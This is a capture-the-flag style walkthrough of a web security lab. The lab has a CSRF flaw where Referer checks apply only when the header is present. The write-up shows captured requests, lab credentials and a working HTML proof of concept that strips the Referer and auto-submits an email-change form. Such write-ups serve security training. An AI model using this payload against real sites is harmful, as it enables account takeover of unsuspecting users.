## CSRF where Referer validation depends on header being present

This lab's email change functionality is vulnerable to CSRF. It attempts to block cross-domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint :

You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

## Notes

- Possibility to leave a comment
- Exploit server
- /login
- Referer validation
- No CSRF token

## Resume

1. Identify the CSRF
2. Study the Referer validation
3. Bypass the Referer check
4. Create a CSRF PoC
5. Deliver the exploit

## Solve

The first step is to inspect the email change functionality.

After updating the email address, we capture the request:

```http
POST /my-account/change-email HTTP/2
Host: 0a4100e804cc9fb4805a03c30089003f.web-security-academy.net
Cookie: session=IbPRcw1HBONVC3jYicDMSXMXXmM02gps
Referer: https://0a4100e804cc9fb4805a03c30089003f.web-security-academy.net/my-account?id=wiener

email=toto%40toto.com
```

We immediately notice that no CSRF token is present.

Next, we test the Referer validation by modifying the header:

```http
POST /my-account/change-email HTTP/2
Host: 0a4100e804cc9fb4805a03c30089003f.web-security-academy.net
Cookie: session=IbPRcw1HBONVC3jYicDMSXMXXmM02gps
Referer: https://test.com

email=toto%40toto.com
```

Response:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 24

"Invalid referer header"
```

The application verifies that the Referer belongs to the target domain.

However, if we completely remove the Referer header:

```http
POST /my-account/change-email HTTP/2
Host: 0a4100e804cc9fb4805a03c30089003f.web-security-academy.net
Cookie: session=IbPRcw1HBONVC3jYicDMSXMXXmM02gps

email=toto%40toto.com
```

The request is accepted:

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

This confirms that Referer validation is only performed when the header is present.

To exploit this behavior, we create a CSRF proof of concept that suppresses the Referer header using the `referrer` meta tag:

```html
<html>
  <meta name="referrer" content="no-referrer">

  <body>
    <form action="https://0a4100e804cc9fb4805a03c30089003f.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@labs.com">
      <input type="submit" value="Submit request">
    </form>

    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

When the victim loads the page:

1. The browser suppresses the Referer header.
2. The CSRF request is automatically submitted.
3. The application skips Referer validation.
4. The victim's email address is changed.

Store the exploit on the exploit server and deliver it to the victim to solve the lab.